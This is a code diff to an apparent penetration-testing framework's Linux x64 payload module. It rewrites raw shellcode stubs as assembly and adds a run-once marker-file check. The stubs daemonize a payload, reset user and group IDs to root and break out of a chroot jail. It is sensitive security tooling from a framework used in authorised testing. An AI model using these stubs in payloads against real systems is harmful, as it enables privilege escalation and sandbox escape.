@@ -4,7 +4,7 @@
 module Msf::Payload::Linux::X64::Prepends
   include Msf::Payload::Linux::Prepends
   def prepends_order
-    %w[PrependFork PrependSetresuid PrependSetreuid PrependSetuid]
+    %w[PrependExecOnce PrependFork PrependSetresuid PrependSetreuid PrependSetuid]
   end
 
   def appends_order
@@ -12,121 +12,148 @@ module Msf::Payload::Linux::X64::Prepends
   end
 
   def prepends_map
-    {
-      'PrependFork' => "\x6a\x39" + #    push    57        ; __NR_fork     #
-        "\x58" + #    pop     rax                       #
-        "\x0f\x05" + #    syscall                           #
-        "\x48\x85\xc0" + #    test    rax,rax                   #
-        "\x74\x08" + #    jz      loc_0012                  #
-        #  loc_000a:                           #
-        "\x48\x31\xff" + #    xor     rdi,rdi                   #
-        "\x6a\x3c" + #    push    60        ; __NR_exit     #
-        "\x58" + #    pop     rax                       #
-        "\x0f\x05" + #    syscall                           #
-        #  loc_0012:                           #
-        "\x04\x70" + #    add     al, 112   ; __NR_setsid   #
-        "\x0f\x05" + #    syscall                           #
-        "\x6a\x39" + #    push    57        ; __NR_fork     #
-        "\x58" + #    pop     rax                       #
-        "\x0f\x05" + #    syscall                           #
-        "\x48\x85\xc0" + #    test    rax,rax                   #
-        "\x75\xea", #    jnz     loc_000a                  #
-
-      # setresuid(0, 0, 0)
-      'PrependSetresuid' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
-        "\x48\x89\xfe" + #    mov     rsi,rdi                   #
-        "\x6a\x75" + #    push    0x75                      #
-        "\x58" + #    pop     rax                       #
-        "\x0f\x05", #    syscall                           #
-
-      # setreuid(0, 0)
-      'PrependSetreuid' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
-        "\x48\x89\xfe" + #    mov     rsi,rdi                   #
-        "\x48\x89\xf2" + #    mov     rdx,rsi                   #
-        "\x6a\x71" + #    push    0x71                      #
-        "\x58" + #    pop     rax                       #
-        "\x0f\x05", #    syscall                           #
-
-      # setuid(0)
-      'PrependSetuid' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
-        "\x6a\x69" + #    push    0x69                      #
-        "\x58" + #    pop     rax                       #
-        "\x0f\x05", #    syscall                           #
-
-      # setresgid(0, 0, 0)
-      'PrependSetresgid' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
-        "\x48\x89\xfe" + #    mov     rsi,rdi                   #
-        "\x6a\x77" + #    push    0x77                      #
-        "\x58" + #    pop     rax                       #
-        "\x0f\x05", #    syscall                           #
-
-      # setregid(0, 0)
-      'PrependSetregid' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
-        "\x48\x89\xfe" + #    mov     rsi,rdi                   #
-        "\x48\x89\xf2" + #    mov     rdx,rsi                   #
-        "\x6a\x72" + #    push    0x72                      #
-        "\x58" + #    pop     rax                       #
-        "\x0f\x05", #    syscall                           #
-
-      # setgid(0)
-      'PrependSetgid' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
-        "\x6a\x6a" + #    push    0x6a                      #
-        "\x58" + #    pop     rax                       #
-        "\x0f\x05", #    syscall                           #
-
-      # setreuid(0, 0) + break chroot
-      'PrependChrootBreak' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
-        "\x48\x89\xfe" + #    mov     rsi,rdi                   #
-        "\x48\x89\xf8" + #    mov     rax,rdi                   #
-        "\xb0\x71" + #    mov     al,0x71                   #
-        "\x0f\x05" + #    syscall                           #
-        # generate temp dir name
-        "\x48\xbf#{Rex::Text.rand_text_alpha(8)}" + #    mov     rdi, <random 8 bytes alpha>  #
-        "\x56" + #    push    rsi                       #
-        "\x57" + #    push    rdi                       #
-        # mkdir(random,0755)
-        "\x48\x89\xe7" + #    mov     rdi,rsp                   #
-        "\x66\xbe\xed\x01" + #    mov     si,0755                   #
-        "\x6a\x53" + #    push    0x53                      #
-        "\x58" + #    pop     rax                       #
-        "\x0f\x05" + #    syscall                           #
-
-        # chroot(random)
-        "\x48\x31\xd2" + #    xor     rdx,rdx                   #
-        "\xb2\xa1" + #    mov     dl,0xa1                   #
-        "\x48\x89\xd0" + #    mov     rax,rdx                   #
-        "\x0f\x05" + #    syscall                           #
-
-        # build .. (ptr in rdi )
-        "\x66\xbe\x2e\x2e" + #    mov     si,0x2e2e                 #
-        "\x56" + #    push    rsi                       #
-        "\x48\x89\xe7" + #    mov     rdi,rsp                   #
-
-        # loop chdir(..) 69 times
-        # syscall tend to modify rcx can't use loop...
-        "\x6a\x45" + #    push    0x45                      #
-        "\x5b" + #    pop     rbx                       #
-        "\x6a\x50" + #    push    0x50                      #
-        "\x58" + #    pop     rax                       #
-        "\x0f\x05" + #    syscall                           #
-        "\xfe\xcb" + #    dec     bl                        #
-        "\x75\xf7" + #    jnz     -7                        #
-
-        # chroot (.) (which should be /)
-        "\x6a\x2e" + #    push    .  (0x2e)                 #
-        "\x48\x89\xe7" + #    mov     rdi,rsp                   #
-        "\x48\x89\xd0" + #    mov     rax,rdx                   #
-        "\x0f\x05"
-    } #    syscall                           #
+    @prepends_map ||= {
+      'PrependExecOnce' => prepend_exec_once,
+      'PrependFork' => x64_assemble(%(
+        push 0x39
+        pop rax
+        syscall
+        test rax, rax
+        jz child
+      parent:
+        xor rdi, rdi
+        push 0x3c
+        pop rax
+        syscall
+      child:
+        add al, 0x70
+        syscall
+        push 0x39
+        pop rax
+        syscall
+        test rax, rax
+        jnz parent
+      )),
+      'PrependSetresuid' => x64_assemble(%(
+        xor rdi, rdi
+        mov rsi, rdi
+        push 0x75
+        pop rax
+        syscall
+      )),
+      'PrependSetreuid' => x64_assemble(%(
+        xor rdi, rdi
+        mov rsi, rdi
+        mov rdx, rsi
+        push 0x71
+        pop rax
+        syscall
+      )),
+      'PrependSetuid' => x64_assemble(%(
+        xor rdi, rdi
+        push 0x69
+        pop rax
+        syscall
+      )),
+      'PrependSetresgid' => x64_assemble(%(
+        xor rdi, rdi
+        mov rsi, rdi
+        push 0x77
+        pop rax
+        syscall
+      )),
+      'PrependSetregid' => x64_assemble(%(
+        xor rdi, rdi
+        mov rsi, rdi
+        mov rdx, rsi
+        push 0x72
+        pop rax
+        syscall
+      )),
+      'PrependSetgid' => x64_assemble(%(
+        xor rdi, rdi
+        push 0x6a
+        pop rax
+        syscall
+      )),
+      'PrependChrootBreak' => x64_assemble(%(
+        xor rdi, rdi
+        mov rsi, rdi
+        mov rax, rdi
+        mov al, 0x71
+        syscall
+        mov rdi, 0x#{Rex::Text.rand_text_alpha(8).unpack1('Q<').to_s(16)}
+        push rsi
+        push rdi
+        mov rdi, rsp
+        mov si, 0x1ed
+        push 0x53
+        pop rax
+        syscall
+        xor rdx, rdx
+        mov dl, 0xa1
+        mov rax, rdx
+        syscall
+        mov si, 0x2e2e
+        push rsi
+        mov rdi, rsp
+        push 0x45
+        pop rbx
+      chdir_loop:
+        push 0x50
+        pop rax
+        syscall
+        dec bl
+        jnz chdir_loop
+        push 0x2e
+        mov rdi, rsp
+        mov rax, rdx
+        syscall
+      ))
+    }
   end
 
   def appends_map
-    {
-      # exit(0)
-      'AppendExit' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
-        "\x6a\x3c" + #    push    0x3c                      #
-        "\x58" + #    pop     rax                       #
-        "\x0f\x05" #    syscall                           #
+    @appends_map ||= {
+      'AppendExit' => x64_assemble(%(
+        xor rdi, rdi
+        push 0x3c
+        pop rax
+        syscall
+      ))
     }
+  end
+
+  private
+
+  def prepend_exec_once
+    @prepend_exec_once ||= x64_assemble(%(
+      jmp marker
+    open_marker:
+      pop rsi
+      mov edi, -100
+      mov edx, 0xc1
+      mov r10d, 0x180
+      mov eax, 257
+      syscall
+      test eax, eax
+      js stop
+      mov edi, eax
+      mov eax, 3
+      syscall
+      jmp payload
+    stop:
+      xor edi, edi
+      mov eax, 60
+      syscall
+    marker:
+      call open_marker
+      db '#{prepend_exec_once_path}', 0
+    payload:
+    ))
+  end
+
+  def x64_assemble(source)
+    Metasm::Shellcode.assemble(Metasm::X64.new, source).encode_string
   end
 end
